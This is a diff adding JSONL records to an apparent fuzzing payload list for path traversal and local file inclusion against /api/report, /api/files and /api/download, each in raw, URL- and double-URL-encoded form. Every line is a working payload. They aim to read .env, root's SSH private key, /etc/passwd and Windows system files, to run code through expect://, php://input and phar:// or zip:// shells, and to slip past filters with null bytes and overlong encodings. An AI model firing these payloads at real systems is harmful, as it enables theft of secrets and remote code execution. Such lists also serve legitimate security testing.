+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "double-url", "payload": "..%252F..%252F..%252F.env", "base": "../../../.env"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "..%2F..%2F..%2F..%2Froot%2F.ssh%2Fid_rsa", "base": "../../../../root/.ssh/id_rsa"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "url", "payload": "..%2F..%2F..%2F..%2Froot%2F.ssh%2Fid_rsa", "base": "../../../../root/.ssh/id_rsa"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "double-url", "payload": "..%252F..%252F..%252F..%252Froot%252F.ssh%252Fid_rsa", "base": "../../../../root/.ssh/id_rsa"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "raw", "payload": "php://filter/convert.base64-encode/resource=index.php", "base": "php://filter/convert.base64-encode/resource=index.php"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "url", "payload": "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php", "base": "php://filter/convert.base64-encode/resource=index.php"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dindex.php", "base": "php://filter/convert.base64-encode/resource=index.php"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "raw", "payload": "file%3A%2F%2F%2Fetc%2Fpasswd", "base": "file:///etc/passwd"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "file%3A%2F%2F%2Fetc%2Fpasswd", "base": "file:///etc/passwd"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "double-url", "payload": "file%253A%252F%252F%252Fetc%252Fpasswd", "base": "file:///etc/passwd"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "zip%3A%2F%2Fuploads%2Fa.zip%23shell.php", "base": "zip://uploads/a.zip#shell.php"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "url", "payload": "zip%3A%2F%2Fuploads%2Fa.zip%23shell.php", "base": "zip://uploads/a.zip#shell.php"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "double-url", "payload": "zip%253A%252F%252Fuploads%252Fa.zip%2523shell.php", "base": "zip://uploads/a.zip#shell.php"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "raw", "payload": "phar://uploads/a.jpg/shell", "base": "phar://uploads/a.jpg/shell"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "url", "payload": "phar%3A%2F%2Fuploads%2Fa.jpg%2Fshell", "base": "phar://uploads/a.jpg/shell"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "phar%253A%252F%252Fuploads%252Fa.jpg%252Fshell", "base": "phar://uploads/a.jpg/shell"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "raw", "payload": "expect%3A%2F%2Fid", "base": "expect://id"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "expect%3A%2F%2Fid", "base": "expect://id"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "double-url", "payload": "expect%253A%252F%252Fid", "base": "expect://id"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.png", "base": "../../../../etc/passwd\u0000.png"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "url", "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.png", "base": "../../../../etc/passwd\u0000.png"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "double-url", "payload": "..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png", "base": "../../../../etc/passwd\u0000.png"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "raw", "payload": "C:\\Windows\\System32\\drivers\\etc\\hosts", "base": "C:\\Windows\\System32\\drivers\\etc\\hosts"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "url", "payload": "C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts", "base": "C:\\Windows\\System32\\drivers\\etc\\hosts"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "C%253A%255CWindows%255CSystem32%255Cdrivers%255Cetc%255Chosts", "base": "C:\\Windows\\System32\\drivers\\etc\\hosts"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "raw", "payload": "..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd", "base": "..%c0%af..%c0%af..%c0%afetc/passwd"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "..%25c0%25af..%25c0%25af..%25c0%25afetc%2Fpasswd", "base": "..%c0%af..%c0%af..%c0%afetc/passwd"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "double-url", "payload": "..%2525c0%2525af..%2525c0%2525af..%2525c0%2525afetc%252Fpasswd", "base": "..%c0%af..%c0%af..%c0%afetc/passwd"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%2Fvar%2Flog%2Fapache2%2Faccess.log", "base": "/var/log/apache2/access.log"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "url", "payload": "%2Fvar%2Flog%2Fapache2%2Faccess.log", "base": "/var/log/apache2/access.log"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "double-url", "payload": "%252Fvar%252Flog%252Fapache2%252Faccess.log", "base": "/var/log/apache2/access.log"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "raw", "payload": "....\\\\....\\\\....\\\\windows\\\\win.ini", "base": "....\\\\....\\\\....\\\\windows\\\\win.ini"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "url", "payload": "....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Cwin.ini", "base": "....\\\\....\\\\....\\\\windows\\\\win.ini"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "....%255C%255C....%255C%255C....%255C%255Cwindows%255C%255Cwin.ini", "base": "....\\\\....\\\\....\\\\windows\\\\win.ini"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "raw", "payload": "..%2F..%2F..%2F..%2F..%2Fboot.ini", "base": "../../../../../boot.ini"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "..%2F..%2F..%2F..%2F..%2Fboot.ini", "base": "../../../../../boot.ini"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "double-url", "payload": "..%252F..%252F..%252F..%252F..%252Fboot.ini", "base": "../../../../../boot.ini"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%2Fproc%2Fself%2Fcmdline", "base": "/proc/self/cmdline"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "url", "payload": "%2Fproc%2Fself%2Fcmdline", "base": "/proc/self/cmdline"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "double-url", "payload": "%252Fproc%252Fself%252Fcmdline", "base": "/proc/self/cmdline"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "raw", "payload": "php://input", "base": "php://input"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "url", "payload": "php%3A%2F%2Finput", "base": "php://input"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "php%253A%252F%252Finput", "base": "php://input"}
